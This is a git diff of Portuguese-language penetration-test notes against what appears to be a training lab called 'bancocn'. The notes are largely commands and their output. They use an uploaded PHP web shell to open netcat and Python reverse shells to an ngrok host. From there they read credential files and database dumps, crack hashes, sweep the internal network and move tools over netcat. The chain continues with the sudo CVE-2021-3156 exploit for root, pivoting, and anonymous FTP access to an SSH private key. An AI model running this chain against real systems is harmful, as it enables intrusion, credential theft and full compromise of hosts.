@@ -136,15 +136,15 @@ porta: 14328
 
 Depois no url:
 www.bancocn.com/admin/uploads/shell.php7?cmd=nc [URL] [PORTA] -e /bin/bash
-www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 16280 -e /bin/bash
+www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 18114 -e /bin/bash
 
 ### Fazendo Reverse Python
 
-www.bancocn.com/admin/uploads/shell.php7?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",14328));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+www.bancocn.com/admin/uploads/shell.php7?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",17041));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 Fazer de forma interativa:
 
-python -c "import pty;pty.spawn('/bin/bash')" // usando o terminal
+python -c "import pty;pty.spawn('/bin/bash')"
 
 ### Modificando o site
 
@@ -162,6 +162,12 @@ cat /var/www/html/admin/uploads/bancocn.sql
 
 utiliza o comando:
 
+cd /var/backups
+
+cat creds.txt
+
+hash: 
+
 john hash.txt
 
 # Credenciais
@@ -170,24 +176,198 @@ Acesso do administrador:
 admin
 senhafoda
 
-/var/backups/creds.txt
-
 Encontro de mais um acesso:
 bob
 123456
 
 # Aumentando privilégios
 
-## Verificando os pins, para tentar achar alguma máquina para escalar privilégio
+## Achando ips
 
-for i in {1...254}; do (ping -c 1 10.20.20.$i&); done
+ifconfig
+
+exemplo, 10.20.20.1
+10.20.20.2
+
+... e vai alternando até 256
+
+## Verificando os pins, para tentar achar alguma máquina para escalar privilégio - usando bashscript
+
+// pegando apenas os ips ativos na rede
+for i in {1..254}; do (ping -c 1 10.20.20.$i | grep "64 bytes" &); done
+
+64 bytes from 10.20.20.1: icmp_seq=1 ttl=64 time=0.048 ms
+64 bytes from 10.20.20.2: icmp_seq=1 ttl=64 time=0.025 ms
+64 bytes from 10.20.20.3: icmp_seq=1 ttl=64 time=0.100 ms // maquina nova
+64 bytes from 10.20.20.156: icmp_seq=1 ttl=64 time=0.120 ms
 
 ## Busca de portas
 
 nc -w 1 -zv 10.20.20.3 1-500
 
-## Acessando o usuário
+bancocn-lab-post.bancocn_internal_network [10.20.20.3] 22 (ssh) open
+
+// mostra que a porta 22 está aberta e é uma máquina também, que é possivelmente do bob
+
+## Acessando o usuário - logando com o ssh
 
 ssh bob@10.20.20.3
-
 usa a senha: 123456
+
+// usando o ssh, você acessa um pivot, que é uma máquina dentro de outra máquina
+
+## Processo de pos exploração
+
+### Usando transferência de arquivos
+
+Abrindo outro nc para receber o arquivo
+
+// maquina local
+nc -lvp 789
+
+// maquina do bancocn
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+nc -lvp 456 < LinEnum.sh
+
+// no outro terminal do bob a gente faz o download do arquivo - maquina bob
+cd /tmp
+
+nc 10.20.20.2 456 > lin.sh
+
+// espera um tempo e cancela a conexão no bancocn, depois aguarda e vai aparecer no bob
+
+// agora vamos rodar o script
+
+bash lin.sh
+
+## Pesquisando vulnerabilidades
+
+// Versão do Kernel: 5.4.0 - pesquisando no terminal
+
+searchsploit linux kernel 5.4.0
+
+// versão do sudo
+
+searchsploit 1.9.5p1
+
+// achou uma versão que tem vulnerabilidade, pesquisa no google
+
+## Escalando privilégios
+
+// baixa uma versão que não precisa de brute force
+
+https://github.com/CptGibbon/CVE-2021-3156
+
+### Passando arquivos
+
+// roda no ngronk
+
+nc -lvp 789 < hax.c
+
+// na maquina do bob
+
+nc 0.tcp.sa.ngrok.io 18114 > hax.c
+
+// roda no ngronk novamente
+
+nc -lvp 789 < lib.c
+
+nc 0.tcp.sa.ngrok.io 18114 > lib.c
+
+// roda no ngronk novamente
+
+nc -lvp 789 < Makefile
+
+nc 0.tcp.sa.ngrok.io 18114 > Makefile
+
+// roda o executável
+
+make
+
+// roda o exploit
+
+./exploit
+
+// agora estamos como root
+
+whoiam - mostra o usuário
+
+// agora podemos rodar comandos como root
+
+## Pivoting
+
+### Instalação necessário
+
+export PATH=$PATH:/usr/bin
+
+EXPORT TERM=linux
+
+apt install nmap
+
+### Usando o nmap
+
+nmap 10.20.20.0/24 -sn
+
+// achados:
+10.20.20.156
+
+// agora fazemos as portas abertas
+
+nmap 10.20.20.156
+
+// achados:
+
+porta 21 e 22 - fpt e ssh
+
+// vendo as versões
+
+nmap 10.20.20.156 -sv
+
+// achados:
+
+vsftpd 3.0.3 -> coloca no searchsploit
+
+### Conectando com o ftp
+
+apt install ftp
+
+ftp 10.20.20.156
+
+// alguns servidores utilizam entrada anonima
+
+usuário: anonymous
+senha: 
+(sem senha)
+
+// agora vamos ver os arquivos
+
+ls
+
+// baixa os arquivos com
+
+get passwd
+
+cd .ssh
+
+get id_rsa
+
+// agora vamos ver o arquivo
+
+cat passwd
+
+// achamos o usuário admin
+
+cat id_rsa
+
+// é uma chave que temos acesso com ssh
+
+### Conectando com o ssh
+
+// Primeiro mudar as permissões
+
+chmod 600 id_rsa
+
+// agora vamos conectar
+
+ssh admin@10.20.20.156 -i id_rsa
